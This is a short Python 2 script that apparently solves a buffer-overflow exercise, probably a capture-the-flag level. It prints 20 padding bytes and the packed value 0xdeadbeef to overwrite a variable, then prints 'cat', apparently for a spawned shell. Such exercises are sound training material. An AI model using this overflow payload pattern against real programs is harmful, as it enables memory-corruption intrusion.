#!/bin/python

import struct

padding = 'a'*20
pwn = struct.pack('I', 0xdeadbeef)

print padding + pwn

print "cat"